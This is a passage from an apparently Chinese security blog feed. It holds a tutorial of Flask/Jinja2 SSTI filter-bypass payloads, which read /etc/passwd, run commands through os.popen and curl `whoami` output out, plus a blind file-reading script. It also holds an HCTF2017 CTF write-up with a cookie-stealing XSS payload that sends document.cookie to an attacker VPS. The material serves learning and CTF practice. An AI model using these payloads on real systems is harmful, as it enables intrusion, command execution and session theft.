class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 2.7.15</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>

<h1 id="flask-ssti-常用的-bypass"><a href="#flask-ssti-常用的-bypass" class="headerlink" title="flask ssti 常用的 bypass"></a>flask ssti 常用的 bypass</h1><h2 id="绕过中括号"><a href="#绕过中括号" class="headerlink" title="绕过中括号 []"></a>绕过中括号 []</h2><h3 id="利用-getitem-函数"><a href="#利用-getitem-函数" class="headerlink" title="利用 __getitem__()函数"></a>利用 <code>__getitem__()</code>函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">""</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>

<h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><h3 id="利用chr-函数"><a href="#利用chr-函数" class="headerlink" title="利用chr()函数"></a>利用<code>chr()</code>函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用requests对象传参"><a href="#利用requests对象传参" class="headerlink" title="利用requests对象传参"></a>利用requests对象传参</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">""</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;</span><br><span class="line">path=/etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="绕过下划线"><a href="#绕过下划线" class="headerlink" title="绕过下划线"></a>绕过下划线</h2><h3 id="利用requests对象传参-1"><a href="#利用requests对象传参-1" class="headerlink" title="利用requests对象传参"></a>利用requests对象传参</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>[request.args<span class="class">.<span class="keyword">class</span>][<span class="title">request</span>.<span class="title">args</span>.<span class="title">mro</span>][2][<span class="title">request</span>.<span class="title">args</span>.<span class="title">subclasses</span>]<span class="params">()</span>[40]<span class="params">(<span class="string">'/etc/passwd'</span>)</span>.<span class="title">read</span><span class="params">()</span> &#125;&#125;</span></span><br><span class="line">class=__class__</span><br><span class="line">mro=__mro__</span><br><span class="line">subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<h2 id="绕过大括号"><a href="#绕过大括号" class="headerlink" title="绕过大括号"></a>绕过大括号</h2><h3 id="利用控制语句-37-37"><a href="#利用控制语句-37-37" class="headerlink" title="利用控制语句{&#37; &#37;}"></a>利用控制语句{&#37; &#37;}</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">'p'</span> %&#125;yes&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">dic = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*()_+-=[]&#123;&#125;;\':\",./&lt;&gt;?\\|'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">150</span>):</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> dic:</span><br><span class="line">		payload = <span class="string">'&#123;% if "".__class__.__mro__[2].__subclasses__()[40](\'/tmp/test\').read()['</span> + str(i) + <span class="string">']==\''</span> + _ + <span class="string">'\' %&#125;yes&#123;% endif %&#125;'</span></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">'data'</span>: payload,</span><br><span class="line">		&#125;</span><br><span class="line">		r = requests.post(url, data=data).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'yes'</span> <span class="keyword">in</span> r:</span><br><span class="line">			flag += _</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="同时绕过-大括号-和-下划线"><a href="#同时绕过-大括号-和-下划线" class="headerlink" title="同时绕过 大括号 和 下划线"></a>同时绕过 大括号 和 下划线</h2><h3 id="利用-amp-attr"><a href="#利用-amp-attr" class="headerlink" title="利用 | &amp; attr()"></a>利用 | &amp; attr()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">print</span> <span class="string">""</span>|attr(request.args<span class="class">.<span class="keyword">class</span>)|<span class="title">attr</span><span class="params">(request.args.base)</span>|<span class="title">attr</span><span class="params">(request.args.subclasses)</span><span class="params">()</span>|<span class="title">attr</span><span class="params">(request.args.getitem)</span><span class="params">(<span class="number">99</span>)</span>|<span class="title">attr</span><span class="params">(request.args.init)</span>|<span class="title">attr</span><span class="params">(request.args.globals)</span>|<span class="title">attr</span><span class="params">(request.args.getitem)</span><span class="params">(<span class="string">"o"</span>+<span class="string">"s"</span>)</span>|<span class="title">attr</span><span class="params">(<span class="string">"popen"</span>)</span><span class="params">(<span class="string">"ls"</span>)</span>|<span class="title">attr</span><span class="params">(request.args.re)</span><span class="params">()</span>|<span class="title">safe</span> %&#125;</span></span><br><span class="line">globals=__globals__</span><br><span class="line">subclasses=__subclasses__</span><br><span class="line">re=read</span><br><span class="line">init=__init__</span><br><span class="line">base=__base__</span><br><span class="line">class=__class__</span><br><span class="line">getitem=__getitem__</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>flask + jinja2 的 SSTI 和 python 沙箱逃逸有密不可分的关系，只有自己把内建函数搞清楚才能在遇到的时候靠自己写出来payload</p>
</li>
<li><p>遇到SSTI第一步一定要判断前后端是什么语言什么框架。</p>
</li>
</ul>
<p>附:SSTI 模板判断导图，模板-语言关系图</p>
<p><img src="https://q6fcrw.sn.files.1drv.com/y4myLNDZak2pCjhPIenf32kI7a3LLRkhH0Ir5BIv4Ffn6A7hmtH7rKKPjLPQ5H-n1Ehzisv7N3J1cZI3HxPSTIOguXF95B3z7i0AYW1DKfqLhEg-u6rZmPuu0Ro6T2tu14uOotDOS96PD-n60n7e4v6uquf8rquH1i5InQPcbnZld8TN1C2_MhZckiTGHFXJOWIakiBMEpaCHvJkF2TaFXVYw?width=640&height=386&cropmode=none" alt></p>
<p><img src="https://q6farw.sn.files.1drv.com/y4mU28XYNAZtf0cR4k__c2hnFenGREBawUThRvg9Z66f12ZGgEZVVXiZ36jaTDITgiGpeigBlYklGeMGdAdF3jURQF7wZUu4vYHm7W3mC8MBJwkWPuBvVDwfzycHnCjGI3cw-dwI7JaMcb1-ggC_TJJlpN5x91SebR47n9pzx_CijUxd4B9_ScNkJZMeGO-IHN4pSKgvSpbhA1ax8YnYrnzaQ?width=732&height=835&cropmode=none" alt></p>
<p>图片来源:<a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" target="_blank" rel="noopener">https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png</a></p>
<hr>
<p>参考文章:</p>
<p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/</a><br><a href="https://blog.51cto.com/xpleaf/1764849" target="_blank" rel="noopener">https://blog.51cto.com/xpleaf/1764849</a><br><a href="https://docs.python.org/3/" target="_blank" rel="noopener">https://docs.python.org/3/</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a></p>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SSTI</tag>
        <tag>服务端模板注入</tag>
        <tag>python 沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-HCTF2017-Deserted place</title>
    <url>/2019/07/26/Writeup/WP-HCTF2017-Deserted-place/</url>
    <content><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/hctf_2017_deserted_place/tree/a35b31966a139146dddf7d0a11c1aed1e585e7ea" target="_blank" rel="noopener">https://github.com/CTFTraining/hctf_2017_deserted_place/tree/a35b31966a139146dddf7d0a11c1aed1e585e7ea</a></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/CTFTraining/hctf_2017_deserted_place.git</span><br><span class="line"><span class="keyword">cd</span> hctf_2017_deserted_place</span><br><span class="line">docker-compose <span class="keyword">up</span> -d</span><br><span class="line">docker run -d -<span class="keyword">p</span> <span class="number">1000</span>:<span class="number">80</span> ctftraining/hctf_2017_somexs<span class="variable">s:latest</span></span><br></pre></td></tr></table></figure>

<p>访问 http://[你的ip]:1000/ 即可</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>本题的考点在 XSS 和 SOME<br>XSS 跨站，没什么好介绍的，这道题的主要考点在 SOME</p>
<h2 id="SOME-Same-Origin-Method-Execution-同源方法执行"><a href="#SOME-Same-Origin-Method-Execution-同源方法执行" class="headerlink" title="SOME (Same Origin Method Execution) 同源方法执行"></a>SOME (Same Origin Method Execution) 同源方法执行</h2><p><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf" target="_blank" rel="noopener">SOME 报告原文</a></p>
<p>提到 SOME 要先知道 jsonp ，简单来说，Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名(网站)那获取资料，即跨域读取数据。</p>
<p>网站交互时有时会需要用户要提供一个参数用作要被执行函数的函数名，然后网站在执行对应的 Javascript 函数。JSONP(JSON with Padding)就是允许用户传递一个回调参数给服务端，然后服务端返回数据时会将这个回调参数作为函数名来包裹住 JSON 数据。一个简单的 PHP 示例如下:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//example.com/main  </span></span><br><span class="line">&lt;?php  </span><br><span class="line">echo ‘&lt;script src="https:<span class="comment">//example.com/jsonp?callback=’ . $_GET[“userParam”] .‘ “&gt;’;  </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在上面的代码段中，用户的输入被直接注入到了 script 标签中，JSONP(<a href="https://example.com/jsonp)会返回类似如下的内容" target="_blank" rel="noopener">https://example.com/jsonp)会返回类似如下的内容</a>:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">user<span class="constructor">Param(&#123; <span class="params">jsonp</span> : <span class="params">data</span> &#125;)</span> <span class="comment">// userParam 就是用户之前通过 GET 方法提交的内容</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>深入利用</strong><br>如果攻击者发现一个网站应用存在 SOME 漏洞，那他们绝不会仅仅满足于浏览网页上的各个元素，相反，通过使用 Javascript 内建的 window.opener 方法可以打开同源网站的其他页面。利用这种方法可以大大的扩展攻击面，但缺点也很明显就是需要打开多个页面。</p>
</blockquote>
<blockquote>
<p><strong>使用 window.opener</strong><br>由于我们需要打开多个页面来进行攻击，所以用户必须先登录到攻击者控制的页面上，具体攻击流程如下:</p>
<ol>
<li>用户登录到攻击者的控制的页面(后续称为Window 1)；</li>
<li>从 Window 1中启动一个新窗口(后续称为Window 2)；</li>
<li>Window 2 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面；</li>
<li>Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的目标页面；</li>
<li>Window 2 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面；</li>
<li>Window 2 以 window.opener.functionToExecute 作为回调进行执行；</li>
<li>此时，函数会在 Window 1 中被执行。</li>
</ol>
</blockquote>
<p>流程如下:<br><img src="https://9kclgg.sn.files.1drv.com/y4maD7vmmOs_IrWUUDY9-BsYKsfqaW1CLJIiRjksQrFzS69FFOoROlfyBRyzuWat14PUfmXMxm8sdrfjjZCJaGaQ7-lcIs3Vg1SkkwNe23IMdt6wZM3QQwK4SiND0qD8MvIe7aSXyRu9D-u63OGgrSkeuQ--d-8Z4Pk708zEQAILz1iWJJrOgzDvOAv4nQdYapnigyxqPv6W40ofo7CQ8PfEQ?width=1022&height=768&cropmode=none" alt><br><img src="https://86ctgg.sn.files.1drv.com/y4mKTZ1guQt2FgYk3atYt66eWQzirpV6aYEU9yvT9ls9xuVLyV7srwB5cxVibZtsRvQnV89Tta_tRRj3ziUlpY7B5Qhh65-BMGPEhfkKr02i3Rj0jPHd5iOEqDo52OymJ-Kv7aeGTNBEfQSlI3-Vmo_SGGxRw5nP4W5bYCifcI-yYrkUxDfJ31jjsCo1i10mKVm85PCzUN7OjKRebsv_lS9IA?width=1015&height=761&cropmode=none" alt><br><img src="https://86csgg.sn.files.1drv.com/y4moniD0QNouO_OPgEEYSdu60iAKWyQN6uXTt6oflK7US-QvbbsVJGMwhgb9i0YMCKES2PeK86_Pbjb0txy43ntVSJ41kUGJs67NWZl2Y0dwtQe2nHqAl87ELSBQvsrqGdsWw-8RKG48xyswvvHPjAyLyTSjl6tJeXYnODhGwZY3sp06iOc6JwrHCeEYG_ShuxpUN9G1a_cPpOCWWbIsiPjEg?width=1014&height=761&cropmode=none" alt><br><img src="https://86crgg.sn.files.1drv.com/y4mu9VCiYOLNfJ_I3sSvYcvcLEwj16MXvQGwbeGCGxwKt_PngbdBbJdgKQklaDWnI8Vi7A5NaE80t_lLilDqek6vD2-r0ecWN5L1IaBeTUK1KQl_YsYW25Uez1pFOsaAaZuhcVLh87APhyoINPqR_gIPdGo24f_WwPZkl4XKTOlRo2aQM8CmlLlGbHrx8EuhYl5gwSwh20Miecsfba8otPQlQ?width=1019&height=765&cropmode=none" alt><br><img src="https://86cqgg.sn.files.1drv.com/y4mSQuAT4--ghX-mZZRiWbvV2r8rKEZ8ZIVU3lsYNBzJCuN_8IsnMSiXsdg_Rjnb8sVMOkGH8doYuIt6TlVCo0sBdTZEsSJaKLP0XqPom4q-MEe9pWGYgPKXBZF5G1LvDoIs2oOFGCQq3vg_WhqTcD8pfUsSi6fWfC5XdZ9AoCtSLN_R7AGIZu6bZfa6oFWJt5xJAp_XXZcX_SQJ-n1-8u81w?width=1021&height=765&cropmode=none" alt></p>
<blockquote>
<p><strong>攻击步骤</strong><br>上一节提到的攻击可以被页面上额外的确认弹窗提示阻止，尽管如此，攻击者依旧可以通过以下流程产生额外的窗口来绕过检查:</p>
<ol>
<li>用户登录到攻击者的控制的页面(后续称为Window 1)；</li>
<li>从 Window 1中启动一个新窗口(后续称为Window 2)；</li>
<li>从 Window 1中启动一个新窗口(后续称为Window 3)；</li>
<li>Window 2 和 Window 3 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面；</li>
<li>Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的页面；</li>
<li>Window 2 和 Window 3 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面；</li>
<li>Window 2 以 window.opener.buttonToClick.click 作为回调进行执行，此时 Window 1 页面上的按钮会被点击且同时弹出额外的确认弹窗；</li>
<li>Window 3 以 window.opener.buttonToConfirm.click 作为回调进行执行，以此来点击 Window 1 页面上确认弹窗的确认按钮；</li>
<li>Window 1 上的两个确认按钮均被点击，攻击完成。</li>
</ol>
</blockquote>
<h2 id="扫描工具-SOMEtime-BP插件"><a href="#扫描工具-SOMEtime-BP插件" class="headerlink" title="扫描工具 SOMEtime BP插件"></a>扫描工具 SOMEtime BP插件</h2><p>SOMEtime 是一个 BurpSuite 开源的被动式扫描插件，通过监听 HTTP 请求与响应来判断目标是否存在 SOME 漏洞<br><a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener"></a></p>
<h2 id="如何缓解"><a href="#如何缓解" class="headerlink" title="如何缓解"></a>如何缓解</h2><ul>
<li>网站应用应尽量使用静态定义的回调值；</li>
<li>如果你需要同时支持多个回调端点，最好的办法就是在服务端使用白名单控制回调值，只有指定的回调值才会被执行。</li>
<li>通常来说，JSONP 是一种可以用来绕过同源策略有争议的技术，如果不是必须要使用，建议使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">window.postMessage </a>这个更安全的方法来代替完成跨域请求执行。</li>
</ul>
<h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>题目环境功能有这么几个:登录，注册，修改信息，随机获取别人的信息并写入到自己的信息中，提交报告</p>
<p>测试发现修改信息 message 处存在 XSS 漏洞</p>
<p><img src="https://86cpgg.sn.files.1drv.com/y4m8R6gc7QJ88OLzac1su_9SA9Ult1GxCu9hhFPtW7nMnCpVZ8MI43pXc5o9y8v0rPqDpPuUcspOVUV10h7qzSMigGsYVx2zMBzkcukvQHrd_SFEGEy53K9WF6YwamE51OIcbSlQDEsaaU4Qf3QJBqFnbonKtkp-KFhut9CnstYvs_37I4n3q43W7Xgk4tPTFRBiLeSp9It_GiFwu_Z8gAQkg?width=560&height=593&cropmode=none" alt></p>
<p><img src="https://86cogg.sn.files.1drv.com/y4m-4TaMJaXXusYRf5uxRpfXTReiFf5RqxvvR-wiRnRkrCMf_i2PjxrBt0II22PqXszxPLbOwCPhIybbUNGmH6Jxvp3Wj4KU04I9TtQmIZfMMBLjzrDmITmRVJVJ8yd1bTJ1q-r2iWXF98zhIH8Xxqt9PtekH21oSnB9JZRAbL5bI6mbd4yzo47XvihZGCW4BDeklWxZ3B_zoq8EQYQU44UzQ?width=530&height=257&cropmode=none" alt></p>
<p>然后来看report.php页面</p>
<p>用户可以输入一个 bug link ，然后输入一个需要爆破 md5 的验证码后提交</p>
<blockquote>
<p> 简单思路如下:</p>
<ol>
<li>在 message 处构造 XSS payload ，payload 触发后跳转到公网 vps 的页面上并携带我们需要的COOKIE</li>
<li>将公网 vps 页面的 url 地址提交</li>
<li>等待管理员触发 XSS</li>
<li>触发后访问我们的 vps 页面，得到 COOKIE</li>
</ol>
</blockquote>
<p>需要的 payload 如下:</p>
<blockquote>
<p> vps上写两个页面:</p>
<ol>
<li>1.html<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">&gt;    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span></span><br><span class="line"><span class="actionscript">&gt;        location.replace(<span class="string">"http://[题目地址]/user.php"</span>);</span></span><br><span class="line">&gt;    &#125;</span><br><span class="line">&gt;    setTimeout(start_some(), 1000);</span><br><span class="line">&gt;  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><p>2.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">&gt;       <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">&gt;           location.replace(<span class="string">"http://[题目地址]/edit.php?callback=RandomProfile&amp;user=[你的用户名]"</span>);</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       setTimeout(attack, 2000);</span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<blockquote>
<p> XSS payload:(因为message提交会将+转译成空格，这里需要将+url编码成%2b)</p>
<ul>
<li><code>&lt;img src=&quot;\&quot; onerror=window.location.href=&#39;http://[1.html的地址]?cookie=&#39;%2bdocument.cookie&gt;</code></li>
</ul>
</blockquote>
<p>写个简单的爆破脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># File    :   demo.py</span></span><br><span class="line"><span class="comment"># Time    :   2019/07/26 18:18:16</span></span><br><span class="line"><span class="comment"># Author  :   AbelChe</span></span><br><span class="line"><span class="comment"># Blog    :   https://www.abelche.com</span></span><br><span class="line"><span class="comment"># Email   :   abelche@qq.com, ac.yucheng@gmail.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blasting</span><span class="params">(s)</span>:</span></span><br><span class="line">    HSDICT = <span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span></span><br><span class="line">    <span class="keyword">for</span> var1 <span class="keyword">in</span> HSDICT:</span><br><span class="line">        <span class="keyword">for</span> var2 <span class="keyword">in</span> HSDICT:</span><br><span class="line">            <span class="keyword">for</span> var3 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                <span class="keyword">for</span> var4 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                    <span class="keyword">for</span> var5 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                        <span class="keyword">for</span> var6 <span class="keyword">in</span> HSDICT:</span><br><span class="line">                            s = hashlib.md5()</span><br><span class="line">                            payload = var1 + var2 + var3 + var4 + var5 + var6</span><br><span class="line">                            s.update(payload.encode())</span><br><span class="line">                            res = s.hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                            <span class="keyword">if</span> res == s:</span><br><span class="line">                                exit(payload + <span class="string">'\t'</span> + res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    blasting(input(<span class="string">'substr(md5($code),0,6) == '</span>))</span><br></pre></td></tr></table></figure>

<p>好了，等管理员触发 XSS</p>
<p>然后访问 1.html 查看 cookie 即可</p>
<p><img src="https://86cngg.sn.files.1drv.com/y4mUXnlZ5Q4EyJyBJAuLiYZfs4Vh9rmK_EaHQPjE1UzXtWoqdlBI4Ssuydza1EmCn2f-xUjwm-JwGjCJnHhh7a3ChnncE2Qp6zZ3nY2cbyTRCkxxJNu68hJbo5eJD21jlFuAbuyF5gdK6h_evAZOBCBEML56OEROEhv_-1vOc7W5-ibASDet_kjw60fzgX0-Ts2g9RdxmPBoUSOGbaZfoUPoA?width=497&height=206&cropmode=none" alt></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>查看 /var/www/html/edit.php </p>
<p>回调 callback 代码如下:</p>
